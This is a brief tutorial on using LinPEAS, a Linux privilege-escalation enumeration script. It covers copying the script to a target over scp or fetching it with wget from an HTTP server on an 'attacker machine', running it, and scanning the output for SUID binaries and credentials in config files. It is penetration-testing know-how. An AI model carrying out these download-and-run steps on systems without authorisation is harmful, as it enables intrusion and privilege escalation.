# How to Use LinPEAS

LinPEAS is a Linux Privilege Escalation Awesome Script designed to automate the process of identifying potential privilege escalation paths on Linux systems.

## Setup

1. Ensure that the target Linux machine has a writable directory to upload files.

2. Transfer LinPEAS to the target machine:
   a. If you have SSH access:
      scp ~/Desktop/tools/PEASS-ng/linpeas.sh user@target:/tmp

   b. Alternatively, use a web server to host LinPEAS:
      - Start a Python HTTP server on your attacker machine:
        python3 -m http.server 8080
      - Download LinPEAS on the target:
        wget http://<attacker-ip>:8080/PEASS-ng/linpeas.sh -O /tmp/linpeas.sh

---

## Usage

1. Make LinPEAS executable on the target machine:
   chmod +x /tmp/linpeas.sh

2. Run LinPEAS to scan the system for privilege escalation vectors:
   /tmp/linpeas.sh

3. Capture the output for later review:
   /tmp/linpeas.sh | tee linpeas-output.txt

## Tips

- Run LinPEAS as a **low-privilege user** to identify potential privilege escalation paths.
- Review the output carefully, paying attention to:
  - SUID binaries
  - Misconfigurations
  - Writable directories/files owned by root
  - Credentials in configuration files
- Use the recommendations from LinPEAS output to guide your next steps.
